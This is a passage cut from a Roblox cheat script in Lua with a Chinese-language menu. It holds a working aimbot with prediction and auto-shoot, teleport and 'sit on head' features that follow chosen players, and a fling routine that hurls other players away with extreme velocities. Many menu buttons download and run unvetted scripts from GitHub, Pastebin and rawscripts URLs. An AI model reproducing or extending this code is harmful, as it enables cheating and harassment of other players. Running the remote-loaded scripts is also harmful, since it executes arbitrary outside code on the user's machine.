if model:IsA("Model")and model:FindFirstChild("Humanoid")then
return model
end
end
return nil
end
local function aimIsSameTeam(obj)
if not obj or not me then return false end
if obj:IsA("Player")then
local ok,result=pcall(function()
return obj.Team and me.Team and obj.Team==me.Team
end)
return ok and result
end
if obj:IsA("Model")or obj:IsA("BasePart")then
local teamColor=obj:FindFirstChild("TeamColor")
if teamColor and me.Team then
return teamColor.Value==me.Team.TeamColor
end
local teamTag=obj:FindFirstChild("Team")
if teamTag and me.Team then
return tostring(teamTag.Value)==tostring(me.Team)
end
end
return false
end
local function aimHasWeapon()
local char=me.Character
if not char then return false end
for _,tool in pairs(char:GetChildren())do
if tool:IsA("Tool")then
if tool:FindFirstChild("Handle")then
if tool:FindFirstChild("Ammo")or tool:FindFirstChild("Magazine")or
tool:FindFirstChild("FireMode")or tool:FindFirstChild("Bullets")or
tool:FindFirstChild("Damage")or tool:FindFirstChild("MaxAmmo")or
tool.ClassName=="Tool"then
return true
end
end
end
end
return false
end
local function aimIsPartVisible(part)
if not part then return false end
local localCharacter=me.Character
if not localCharacter then return false end
local origin=camera.CFrame.Position
local direction=part.Position-origin
local distance=direction.Magnitude
if distance<=0 then return false end
local raycastParams=RaycastParams.new()
raycastParams.FilterType=Enum.RaycastFilterType.Exclude
local descendants={}
if localCharacter then
for _,v in ipairs(localCharacter:GetDescendants())do
if v:IsA("BasePart")then
table.insert(descendants,v)
end
end
end
if part.Parent then
for _,v in ipairs(part.Parent:GetDescendants())do
if v:IsA("BasePart")then
table.insert(descendants,v)
end
end
end
raycastParams.FilterDescendantsInstances=descendants
local raycastResult=workspace:Raycast(origin,direction.Unit*distance,raycastParams)
return raycastResult==nil
end
local function aimGetNPCs()
local npcs={}
for _,obj in ipairs(workspace:GetDescendants())do
if obj:IsA("Model")and obj~=me.Character then
local humanoid=obj:FindFirstChildOfClass("Humanoid")
local rootPart=obj:FindFirstChild("HumanoidRootPart")
if humanoid and rootPart and humanoid.Health>0 and not isPetModel(obj) then
local isPlayerChar=false
for _,plr in ipairs(plrs:GetPlayers())do
if plr.Character==obj then
isPlayerChar=true
break
end
end
if not isPlayerChar then
table.insert(npcs,obj)
end
end
end
end
return npcs
end
local function aimGetTargetPart(target)
if not target then return nil end
local char=aimGetCharacter(target)
if not char then return nil end
local part=char:FindFirstChild(AimPart)
if not part then
part=char:FindFirstChild("Head")
end
if not part then
part=char:FindFirstChild("HumanoidRootPart")
end
return part
end
local function aimPredictPosition(target,part)
if not target or not part then
if part then return part.Position end
return Vector3.zero
end
local velocity=Vector3.zero
if part:IsA("BasePart")then
velocity=part.Velocity
elseif part.Velocity then
velocity=part.Velocity
end
if velocity.Magnitude==0 then
local char=aimGetCharacter(target)
if char then
local rootPart=char:FindFirstChild("HumanoidRootPart")
if rootPart and rootPart:IsA("BasePart")then
velocity=rootPart.Velocity
end
end
end
local predictedPosition=part.Position+(velocity*PredictionAmount)
local currentTime=tick()
if currentTime-lastUpdateTime>0.05 then
targetVelocity=(part.Position-lastTargetPosition)/(currentTime-lastUpdateTime)
lastTargetPosition=part.Position
lastUpdateTime=currentTime
end
return predictedPosition
end
AimBox:AddToggle("AimBot",{Text="自瞄",Default=false}):OnChanged(function(Value)
AimbotEnabled=Value
if not Value then
aimTarget=nil
if aimFOVCircle then
aimFOVCircle.Visible=ShowFOV
end
end
end)
AimBox:AddToggle("AimShowFOV",{Text="显示FOV圈",Default=false}):OnChanged(function(Value)
ShowFOV=Value
end)
AimBox:AddToggle("AimTeamCheck",{Text="队伍判断",Default=false}):OnChanged(function(Value)
TeamCheck=Value
end)
AimBox:AddToggle("AimWallCheck",{Text="墙壁检查",Default=false}):OnChanged(function(Value)
WallCheck=Value
end)
AimBox:AddToggle("AimAutoShoot",{Text="自动开枪",Default=false}):OnChanged(function(Value)
AutoShoot=Value
end)
AimBox:AddToggle("AimRequireWeapon",{Text="手持武器自瞄",Default=false}):OnChanged(function(Value)
RequireWeapon=Value
end)
AimBox:AddToggle("AimIncludeNPCs",{Text="包含NPC/Bot",Default=false}):OnChanged(function(Value)
IncludeNPCs=Value
end)
AimBox:AddDropdown("AimLockMode",{Text="锁定模式",Values={"普通","强锁","平滑"},Default="普通"}):OnChanged(function(v)
LockMode=v
end)
AimBox:AddDropdown("AimPart",{Text="瞄准部位",Values={"Head","HumanoidRootPart","UpperTorso","LowerTorso"},Default="Head"}):OnChanged(function(v)
AimPart=v
end)
AimBox:AddDropdown("AimPriority",{Text="优先模式",Values={"准星最近","距离最近","血量最低"},Default="准星最近"}):OnChanged(function(v)
PriorityMode=v
end)
AimBox:AddSlider("AimFOV",{Text="FOV大小",Min=50,Max=500,Default=150}):OnChanged(function(Value)
FOVSize=math.floor(Value)
if aimFOVCircle then
aimFOVCircle.Radius=FOVSize
end
end)
AimBox:AddSlider("AimSmoothness",{Text="平滑度",Min=1,Max=30,Default=10}):OnChanged(function(Value)
Smoothness=math.floor(Value)
end)
AimBox:AddSlider("AimPrediction",{Text="预判量",Min=0,Max=5,Default=0}):OnChanged(function(Value)
PredictionAmount=Value
end)
local specificAimInput=AimBox:AddInput("AimSpecific",{Text="特定目标",Default=""})
specificAimInput:OnChanged(function(text)
if text and text~=""then
SpecificTarget=text
else
SpecificTarget=nil
end
end)
AimBox:AddButton("清除特定目标",function()
SpecificTarget=nil
pcall(function()specificAimInput:SetValue("")end)
end)
local blacklistInput=AimBox:AddInput("AimBlacklistAdd",{Text="黑名单名字",Default=""})
local blacklistInputVal=""
blacklistInput:OnChanged(function(text)
blacklistInputVal=text or ""
end)
blacklistLabel=AimBox:AddLabel("黑名单: 无")
local function refreshBlacklistLabel()
if blacklistLabel then
if#Blacklist==0 then
pcall(function()blacklistLabel:SetText("黑名单: 无")end)
else
pcall(function()blacklistLabel:SetText("黑名单: "..table.concat(Blacklist,"、"))end)
end
end
end
AimBox:AddButton("添加黑名单",function()
local name=blacklistInputVal
if name and name~=""then
local found=false
for _,v in ipairs(Blacklist)do
if v==name then
found=true
break
end
end
if not found then
table.insert(Blacklist,name)
refreshBlacklistLabel()
pcall(function()blacklistInput:SetValue("")end)
blacklistInputVal=""
end
end
end)
AimBox:AddButton("清空黑名单",function()
Blacklist={}
refreshBlacklistLabel()
end)
run.RenderStepped:Connect(function(deltaTime)
local center=Vector2.new(camera.ViewportSize.X/2,camera.ViewportSize.Y/2)
pcall(function()
if not aimFOVCircle then
createAimFOVCircle()
end
if aimFOVCircle then
aimFOVCircle.Position=center
aimFOVCircle.Radius=FOVSize
aimFOVCircle.Visible=ShowFOV and AimbotEnabled
end
end)
if not AimbotEnabled then
aimTarget=nil
if aimFOVCircle then
aimFOVCircle.Color=Color3.fromRGB(255,60,60)
aimFOVCircle.Visible=ShowFOV
end
return
end
if RequireWeapon and not aimHasWeapon()then
aimTarget=nil
if aimFOVCircle then
aimFOVCircle.Color=Color3.fromRGB(255,60,60)
aimFOVCircle.Visible=ShowFOV
end
return
end
local localChar=me.Character
if not localChar or not localChar:FindFirstChild("HumanoidRootPart")then
aimTarget=nil
if aimFOVCircle then
aimFOVCircle.Color=Color3.fromRGB(255,60,60)
aimFOVCircle.Visible=ShowFOV
end
return
end
local targets={}
local myRoot=localChar.HumanoidRootPart
local blSet={}
for _,name in ipairs(Blacklist)do blSet[name]=true end
for _,plr in ipairs(plrs:GetPlayers())do
local ok=true
if plr==me then ok=false end
local isBlacklisted=blSet[plr.Name]or blSet[plr.DisplayName]
if isBlacklisted then ok=false end
if SpecificTarget and plr.Name~=SpecificTarget and plr.DisplayName~=SpecificTarget then ok=false end
if TeamCheck and aimIsSameTeam(plr)then ok=false end
local char=plr.Character
if not char then ok=false end
local hum=char and char:FindFirstChildOfClass("Humanoid")
if not hum or hum.Health<=0 then ok=false end
local part=aimGetTargetPart(plr)
if not part then ok=false end
if WallCheck and not aimIsPartVisible(part)then ok=false end
local predictedPos=aimPredictPosition(plr,part)
local sp,on=camera:WorldToViewportPoint(predictedPos)
if not on then ok=false end
if ok then
local sd=(Vector2.new(sp.X,sp.Y)-center).Magnitude
if sd<=FOVSize then
local wd=(myRoot.Position-part.Position).Magnitude
table.insert(targets,{target=plr,part=part,sd=sd,wd=wd,hp=hum.Health,predictedPos=predictedPos})
end
end
end
if IncludeNPCs then
local npcs=aimGetNPCs()
for _,npc in ipairs(npcs)do
local hum=npc:FindFirstChildOfClass("Humanoid")
if hum and hum.Health>0 then
local part=aimGetTargetPart(npc)
if part then
if not(WallCheck and not aimIsPartVisible(part))then
local predictedPos=aimPredictPosition(npc,part)
local sp,on=camera:WorldToViewportPoint(predictedPos)
if on then
local sd=(Vector2.new(sp.X,sp.Y)-center).Magnitude
if sd<=FOVSize then
local wd=(myRoot.Position-part.Position).Magnitude
table.insert(targets,{target=npc,part=part,sd=sd,wd=wd,hp=hum.Health,predictedPos=predictedPos})
end
end
end
end
end
end
end
if#targets==0 then
if aimFOVCircle then
aimFOVCircle.Color=Color3.fromRGB(255,60,60)
aimFOVCircle.Visible=ShowFOV
end
aimTarget=nil
return
end
table.sort(targets,function(a,b)
if PriorityMode=="距离最近"then
return a.wd<b.wd
elseif PriorityMode=="血量最低"then
return a.hp<b.hp
else
return a.sd<b.sd
end
end)
local t=targets[1]
aimTarget=t.target
if aimFOVCircle then
aimFOVCircle.Color=Color3.fromRGB(100,255,100)
aimFOVCircle.Visible=ShowFOV
end
local targetPosition=t.predictedPos or t.part.Position
if LockMode=="强锁"then
camera.CFrame=CFrame.new(camera.CFrame.Position,targetPosition)
elseif LockMode=="平滑"then
local targetCF=CFrame.new(camera.CFrame.Position,targetPosition)
local smoothFactor=math.min(1,deltaTime*10)
camera.CFrame=camera.CFrame:Lerp(targetCF,smoothFactor)
else
local targetCF=CFrame.new(camera.CFrame.Position,targetPosition)
local smoothValue=1/Smoothness
if targetVelocity.Magnitude>10 then
smoothValue=math.min(0.5,smoothValue*0.8)
end
camera.CFrame=camera.CFrame:Lerp(targetCF,smoothValue)
end
if AutoShoot and aimTarget then
pcall(function()
if localChar then
for _,tool in pairs(localChar:GetChildren())do
if tool:IsA("Tool")then
if tool:FindFirstChild("Activate")then
local handle=tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart")then
local distance=(handle.Position-targetPosition).Magnitude
if distance<1000 then
tool:Activate()
end
end
end
end
end
end
end)
end
end)
end
__XJW_CTL_N=0
__XJW_GB_N=0
local __PACE_T=os.clock()
function __XJW_PACE()
__XJW_CTL_N=__XJW_CTL_N+1
local now=os.clock()
if now-__PACE_T>=0.08 then
__PACE_T=now
task.wait()
end
end
function __XJW_GB(name)
__XJW_GB_N=__XJW_GB_N+1
__XJW_LBL("界面构建 "..__XJW_GB_N.." "..tostring(name))
local now=os.clock()
if now-__PACE_T>=0.08 then
__PACE_T=now
task.wait()
end
end
__XJW_LBL("构建:趣味功能")
__XJW_GB("其他")
local FeatureBox=Tabs.Function:AddLeftGroupbox("其他","list")
__XJW_PACE()
FeatureBox:AddButton("静默甩飞",function()
safeLoad("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%9D%99%E9%BB%98%E7%94%A9%E9%A3%9E(%E5%BC%80%E6%BA%90).lua")
end)
__XJW_PACE()
FeatureBox:AddButton("祖国人汉化",function()
safeLoad("https://raw.githubusercontent.com/kongbaNB/-/refs/heads/main/%E7%A5%96%E5%9B%BD%E4%BA%BA%E6%B1%89%E5%8C%96")
end)
__XJW_PACE()
FeatureBox:AddButton("无敌少侠飞行r15",function()
local ok,err=pcall(function()
safeLoad("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua")
end)
if not ok then
game.StarterGui:SetCore("SendNotification",{Title="加载失败",Text=tostring(err):sub(1,100),Duration=5})
end
end)
__XJW_PACE()
FeatureBox:AddButton("缓慢快速跑",function()
__XJW_RUN("https://pastebin.com/raw/7fLqezjn","7fLqezjn")
end)
__XJW_PACE()
FeatureBox:AddButton("蜗牛V2",function()
__XJW_RUN("https://pastebin.com/raw/1PvSFyZ4","1PvSFyZ4")
end)
__XJW_PACE()
FeatureBox:AddButton("SCP096",function()
__XJW_RUN("https://rawscripts.net/raw/Universal-Script-FE-SCP-096-36948","Universal-Script-FE-SCP-096-36948")
end)
__XJW_PACE()
FeatureBox:AddButton("时光回溯",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF.lua","时光回溯")
end)
__XJW_PACE()
FeatureBox:AddButton("死亡笔记",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0.lua","死亡笔记")
end)
__XJW_PACE()
FeatureBox:AddButton("更帅的超人式飞行",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%9B%B4%E5%B8%85%E7%9A%84%E8%B6%85%E4%BA%BA%E5%BC%8F%E9%A3%9E%E8%A1%8C.lua","更帅的超人式飞行")
end)
__XJW_GB("其他")
local FeatureBoxR=Tabs.Function:AddRightGroupbox("其他","sparkles")
__XJW_PACE()
FeatureBoxR:AddButton("摄像机穿墙",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%91%84%E5%83%8F%E6%9C%BA%E7%A9%BF%E5%A2%99.lua","摄像机穿墙")
end)
__XJW_PACE()
FeatureBoxR:AddButton("逆转疾跑",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E9%80%86%E8%BD%AC%E7%96%BE%E8%B7%91.lua","逆转疾跑")
end)
__XJW_PACE()
FeatureBoxR:AddButton("死亡笔记V2",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0V2.lua","死亡笔记V2")
end)
__XJW_PACE()
FeatureBoxR:AddButton("星光特效",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%98%9F%E5%85%89%E7%89%B9%E6%95%88.lua","星光特效")
end)
__XJW_PACE()
FeatureBoxR:AddButton("踏空行走",function()
pcall(function()
end)
Notify("踏空行走","踏空行走脚本已加载",3)
end)
local airSwimEnabled=false
local airSwimConns={}
local airSwimBV=nil
local airSwimBG=nil
__XJW_PACE()
FeatureBoxR:AddToggle("AirSwimToggle",{
Text="空中游泳",
Default=false,
}):OnChanged(function(state)
airSwimEnabled=state
local speaker=game:GetService("Players").LocalPlayer
if state then
local char=speaker.Character
if not char then return end
local hum=char:FindFirstChildOfClass("Humanoid")
local root=char:FindFirstChild("HumanoidRootPart")
if not hum or not root then return end
local states={
Enum.HumanoidStateType.Climbing,
Enum.HumanoidStateType.FallingDown,
Enum.HumanoidStateType.Flying,
Enum.HumanoidStateType.Freefall,
Enum.HumanoidStateType.GettingUp,
Enum.HumanoidStateType.Jumping,
Enum.HumanoidStateType.Landed,
Enum.HumanoidStateType.Physics,
Enum.HumanoidStateType.PlatformStanding,
Enum.HumanoidStateType.Ragdoll,
Enum.HumanoidStateType.Running,
Enum.HumanoidStateType.RunningNoPhysics,
Enum.HumanoidStateType.Seated,
Enum.HumanoidStateType.StrafingNoPhysics,
Enum.HumanoidStateType.Swimming,
}
for _,s in ipairs(states)do
hum:SetStateEnabled(s,false)
end
hum:ChangeState(Enum.HumanoidStateType.Swimming)
local swimControl={
enabled=true,
speed=25,
moving={forward=false,backward=false,left=false,right=false,up=false,down=false}
}
airSwimBV=Instance.new("BodyVelocity")
airSwimBV.Name="SwimBodyVelocity"
airSwimBV.Parent=root
airSwimBV.MaxForce=Vector3.new(4000,4000,4000)
airSwimBV.Velocity=Vector3.new(0,0,0)
airSwimBG=Instance.new("BodyGyro")
airSwimBG.Name="SwimBodyGyro"
airSwimBG.Parent=root
airSwimBG.MaxTorque=Vector3.new(2000,2000,2000)
airSwimBG.D=500
airSwimBG.P=8000
local UIS=game:GetService("UserInputService")
airSwimConns.inputBegin=UIS.InputBegan:Connect(function(input,processed)
if processed then return end
if input.KeyCode==Enum.KeyCode.W then swimControl.moving.forward=true
elseif input.KeyCode==Enum.KeyCode.S then swimControl.moving.backward=true
elseif input.KeyCode==Enum.KeyCode.A then swimControl.moving.left=true
elseif input.KeyCode==Enum.KeyCode.D then swimControl.moving.right=true
elseif input.KeyCode==Enum.KeyCode.Space then swimControl.moving.up=true
elseif input.KeyCode==Enum.KeyCode.LeftControl or input.KeyCode==Enum.KeyCode.LeftShift then swimControl.moving.down=true
end
end)
airSwimConns.inputEnd=UIS.InputEnded:Connect(function(input,processed)
if processed then return end
if input.KeyCode==Enum.KeyCode.W then swimControl.moving.forward=false
elseif input.KeyCode==Enum.KeyCode.S then swimControl.moving.backward=false
elseif input.KeyCode==Enum.KeyCode.A then swimControl.moving.left=false
elseif input.KeyCode==Enum.KeyCode.D then swimControl.moving.right=false
elseif input.KeyCode==Enum.KeyCode.Space then swimControl.moving.up=false
elseif input.KeyCode==Enum.KeyCode.LeftControl or input.KeyCode==Enum.KeyCode.LeftShift then swimControl.moving.down=false
end
end)
airSwimConns.heartbeat=RunService.Heartbeat:Connect(function()
if not swimControl.enabled then return end
local moveDir=Vector3.new(0,0,0)
if swimControl.moving.forward then moveDir=moveDir+workspace.CurrentCamera.CFrame.LookVector end
if swimControl.moving.backward then moveDir=moveDir-workspace.CurrentCamera.CFrame.LookVector end
if swimControl.moving.left then moveDir=moveDir-workspace.CurrentCamera.CFrame.RightVector end
if swimControl.moving.right then moveDir=moveDir+workspace.CurrentCamera.CFrame.RightVector end
if swimControl.moving.up then moveDir=moveDir+Vector3.new(0,1,0)end
if swimControl.moving.down then moveDir=moveDir+Vector3.new(0,-1,0)end
if moveDir.Magnitude>0 then
airSwimBV.Velocity=moveDir.Unit*swimControl.speed
else
airSwimBV.Velocity=Vector3.new(0,0,0)
end
airSwimBG.CFrame=CFrame.new(root.Position,root.Position+workspace.CurrentCamera.CFrame.LookVector)
end)
airSwimConns.charAdded=speaker.CharacterAdded:Connect(function(newChar)
task.wait(0.7)
local newHum=newChar:FindFirstChildOfClass("Humanoid")
if newHum then
for _,s in ipairs(states)do
newHum:SetStateEnabled(s,false)
end
newHum:ChangeState(Enum.HumanoidStateType.Swimming)
end
if swimControl.enabled then
local newRoot=newChar:WaitForChild("HumanoidRootPart")
if airSwimBV then airSwimBV:Destroy()end
if airSwimBG then airSwimBG:Destroy()end
airSwimBV=Instance.new("BodyVelocity")
airSwimBV.Name="SwimBodyVelocity"
airSwimBV.Parent=newRoot
airSwimBV.MaxForce=Vector3.new(4000,4000,4000)
airSwimBV.Velocity=Vector3.new(0,0,0)
airSwimBG=Instance.new("BodyGyro")
airSwimBG.Name="SwimBodyGyro"
airSwimBG.Parent=newRoot
airSwimBG.MaxTorque=Vector3.new(2000,2000,2000)
airSwimBG.D=500
airSwimBG.P=8000
end
end)
pcall(function()Notify("空中游泳","空中游泳已开启 - 可在空中自由移动",3)end)
else
local char=speaker.Character
if char then
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then
local states={
Enum.HumanoidStateType.Climbing,Enum.HumanoidStateType.FallingDown,
Enum.HumanoidStateType.Flying,Enum.HumanoidStateType.Freefall,
Enum.HumanoidStateType.GettingUp,Enum.HumanoidStateType.Jumping,
Enum.HumanoidStateType.Landed,Enum.HumanoidStateType.Physics,
Enum.HumanoidStateType.PlatformStanding,Enum.HumanoidStateType.Ragdoll,
Enum.HumanoidStateType.Running,Enum.HumanoidStateType.RunningNoPhysics,
Enum.HumanoidStateType.Seated,Enum.HumanoidStateType.StrafingNoPhysics,
Enum.HumanoidStateType.Swimming,
}
for _,s in ipairs(states)do
hum:SetStateEnabled(s,true)
end
hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
end
end
for name,conn in pairs(airSwimConns)do
if typeof(conn)=="RBXScriptConnection"then
conn:Disconnect()
airSwimConns[name]=nil
end
end
if airSwimBV then airSwimBV:Destroy()airSwimBV=nil end
if airSwimBG then airSwimBG:Destroy()airSwimBG=nil end
pcall(function()Notify("空中游泳","空中游泳已关闭",3)end)
end
end)
local PPlayers=game:GetService("Players")
local PLocalPlayer=PPlayers.LocalPlayer
local PRunService=game:GetService("RunService")
local function pNotify(title,text)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title=title,Text=text,Duration=3})
end)
end
local function getLocalChar()
return PLocalPlayer.Character
end
local function getTargetPlayer(name)
for _,p in ipairs(PPlayers:GetPlayers())do
if p.Name==name or p.DisplayName==name then return p end
end
return nil
end
local function disableCollision(char)
if not char then return end
for _,part in ipairs(char:GetDescendants())do
if part:IsA("BasePart")then part.CanCollide=false end
end
end
local function enableCollision(char)
if not char then return end
for _,part in ipairs(char:GetDescendants())do
if part:IsA("BasePart")then part.CanCollide=true end
end
end
local PState={conns={},threads={}}
local function refreshPlayerNames()
local names={}
for _,p in ipairs(PPlayers:GetPlayers())do
if p~=PLocalPlayer then table.insert(names,p.Name)end
end
table.sort(names)
return names
end
__XJW_GB("传送功能")
local TeleportBox=Tabs.TP:AddLeftGroupbox("传送功能","send")
local tpTargetName=""
local tpDropdown=TeleportBox:AddDropdown("TP2_Target",{
Text="选择目标玩家",
Values={},
Default="",
Multi=false,
})
tpDropdown:OnChanged(function(v)tpTargetName=v end)
__XJW_PACE()
TeleportBox:AddButton("刷新玩家列表",function()
tpDropdown:SetValues(refreshPlayerNames())
pNotify("刷新","已刷新玩家列表")
end)
__XJW_PACE()
TeleportBox:AddButton("传送到选定玩家",function()
if tpTargetName==""then pNotify("提示","请先选择玩家")return end
local target=getTargetPlayer(tpTargetName)
if not target or not target.Character then pNotify("失败","目标不存在")return end
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
if root and targetRoot then
root.CFrame=targetRoot.CFrame
pNotify("成功","已传送到 "..target.Name)
end
end)
local tpLoopSingle=false
__XJW_PACE()
TeleportBox:AddToggle("TP2_LoopSingle",{Text="循环传送",Default=false}):OnChanged(function(v)
tpLoopSingle=v
if v then
local thread=task.spawn(function()
while tpLoopSingle do
if tpTargetName~=""then
local target=getTargetPlayer(tpTargetName)
if target and target.Character then
local char=getLocalChar()
if char then
local root=char:FindFirstChild("HumanoidRootPart")
local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
if root and targetRoot then root.CFrame=targetRoot.CFrame end
end
end
end
task.wait(0.3)
end
end)
table.insert(PState.threads,thread)
end
end)
__XJW_GB("坐头功能")
local HeadSitBox=Tabs.TP:AddLeftGroupbox("坐头功能","users")
local sitHeadTargetName=""
local sitHeadDropdown=HeadSitBox:AddDropdown("SitHead_Target",{
Text="选择目标玩家",
Values={},
Default="",
Multi=false,
})
sitHeadDropdown:OnChanged(function(v)sitHeadTargetName=v end)
__XJW_PACE()
HeadSitBox:AddButton("刷新玩家列表",function()
sitHeadDropdown:SetValues(refreshPlayerNames())
pNotify("刷新","已刷新玩家列表")
end)
local headSitActive=false
local loopHeadSit=false
local function stopHeadSit()
headSitActive=false
if PState.conns.headSit then
PState.conns.headSit:Disconnect()
PState.conns.headSit=nil
end
local char=getLocalChar()
if char then
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit=false end
enableCollision(char)
end
pNotify("坐头停止","已停止坐头")
end
local function startHeadSit(playerName)
if PState.conns.headSit then
PState.conns.headSit:Disconnect()
PState.conns.headSit=nil
end
headSitActive=true
local char=getLocalChar()
if not char then pNotify("失败","角色未加载")headSitActive=false return end
local hum=char:FindFirstChildOfClass("Humanoid")
local root=char:FindFirstChild("HumanoidRootPart")
if not hum or not root then pNotify("失败","角色缺少部件")headSitActive=false return end
disableCollision(char)
hum.Sit=true
PState.conns.headSit=PRunService.Heartbeat:Connect(function()
pcall(function()
if not headSitActive or not char.Parent then
if loopHeadSit and PLocalPlayer.Character then
task.wait(1)
if loopHeadSit and sitHeadTargetName~=""then
startHeadSit(sitHeadTargetName)
end
else
stopHeadSit()
end
return
end
local target=getTargetPlayer(playerName)
if not target or not target.Character then
if loopHeadSit then
task.wait(1)
if loopHeadSit and sitHeadTargetName~=""then
startHeadSit(sitHeadTargetName)
end
else
stopHeadSit()
end
return
end
local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
if not targetRoot then return end
root.CFrame=targetRoot.CFrame*CFrame.new(0,1.6,0.4)
disableCollision(char)
end)
end)
pNotify("坐头启动","已开始坐 "..tostring(playerName).." 的头")
end
__XJW_PACE()
HeadSitBox:AddButton("坐选定玩家头上",function()
if sitHeadTargetName==""then pNotify("提示","请先选择玩家")return end
stopHeadSit()
startHeadSit(sitHeadTargetName)
end)
__XJW_PACE()
HeadSitBox:AddToggle("SitHead_Loop",{Text="循环坐头(死亡后继续)",Default=false}):OnChanged(function(v)
loopHeadSit=v
if v and sitHeadTargetName~=""then
stopHeadSit()
startHeadSit(sitHeadTargetName)
else
stopHeadSit()
end
end)
__XJW_PACE()
HeadSitBox:AddButton("停止坐头",stopHeadSit)
__XJW_GB("甩飞功能")
local FlingBox2=Tabs.TP:AddLeftGroupbox("甩飞功能","wind")
local flingTargetName=""
local flingDropdown=FlingBox2:AddDropdown("Fling2_Target",{
Text="选择目标玩家",
Values={},
Default="",
Multi=false,
})
flingDropdown:OnChanged(function(v)flingTargetName=v end)
__XJW_PACE()
FlingBox2:AddButton("刷新玩家列表",function()
flingDropdown:SetValues(refreshPlayerNames())
pNotify("刷新","已刷新玩家列表")
end)
local flingLoops2={single=false,all=false}
local function SkidFling2(targetPlayer)
local Player=PLocalPlayer
local Character=Player.Character
local Humanoid=Character and Character:FindFirstChildOfClass("Humanoid")
local RootPart=Humanoid and Humanoid.RootPart
if not RootPart then return end
local TCharacter=targetPlayer.Character
if not TCharacter then return end
local THumanoid=TCharacter:FindFirstChildOfClass("Humanoid")
local TRootPart=THumanoid and THumanoid.RootPart
local THead=TCharacter:FindFirstChild("Head")
local Accessory=TCharacter:FindFirstChildOfClass("Accessory")
local Handle=Accessory and Accessory:FindFirstChild("Handle")
if RootPart.Velocity.Magnitude<50 then
getgenv().OldPos=RootPart.CFrame
end
if THumanoid and THumanoid.Sit then return end
if THead then
workspace.CurrentCamera.CameraSubject=THead
elseif Handle then
workspace.CurrentCamera.CameraSubject=Handle
elseif THumanoid then
workspace.CurrentCamera.CameraSubject=THumanoid
end
local FPos=function(BasePart,Pos,Ang)
RootPart.CFrame=CFrame.new(BasePart.Position)*Pos*Ang
Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position)*Pos*Ang)
RootPart.Velocity=Vector3.new(9e7,9e7*10,9e7)
RootPart.RotVelocity=Vector3.new(9e8,9e8,9e8)
end
local SFBasePart=function(BasePart)
local TimeToWait=2
local Time=tick()
local Angle=0
repeat
if RootPart and THumanoid then
if BasePart.Velocity.Magnitude<50 then
Angle=Angle+100
FPos(BasePart,CFrame.new(0,1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
FPos(BasePart,CFrame.new(2.25,1.5,-2.25)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
FPos(BasePart,CFrame.new(-2.25,-1.5,2.25)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,1.5,0)+THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0)+THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle),0,0))
task.wait()
else
FPos(BasePart,CFrame.new(0,1.5,THumanoid.WalkSpeed),CFrame.Angles(math.rad(90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,-THumanoid.WalkSpeed),CFrame.Angles(0,0,0))
task.wait()
FPos(BasePart,CFrame.new(0,1.5,THumanoid.WalkSpeed),CFrame.Angles(math.rad(90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,1.5,TRootPart.Velocity.Magnitude/1.25),CFrame.Angles(math.rad(90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,-TRootPart.Velocity.Magnitude/1.25),CFrame.Angles(0,0,0))
task.wait()
FPos(BasePart,CFrame.new(0,1.5,TRootPart.Velocity.Magnitude/1.25),CFrame.Angles(math.rad(90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(math.rad(90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(0,0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(math.rad(-90),0,0))
task.wait()
FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(0,0,0))
task.wait()
end
else
break
end
until BasePart.Velocity.Magnitude>500 or BasePart.Parent~=targetPlayer.Character or targetPlayer.Parent~=PPlayers or not targetPlayer.Character==TCharacter or(THumanoid and THumanoid.Sit)or Humanoid.Health<=0 or tick()>Time+TimeToWait
end
workspace.FallenPartsDestroyHeight=0/0
local BV=Instance.new("BodyVelocity")
BV.Name="EpixVel"
BV.Parent=RootPart
BV.Velocity=Vector3.new(9e8,9e8,9e8)
BV.MaxForce=Vector3.new(1/0,1/0,1/0)
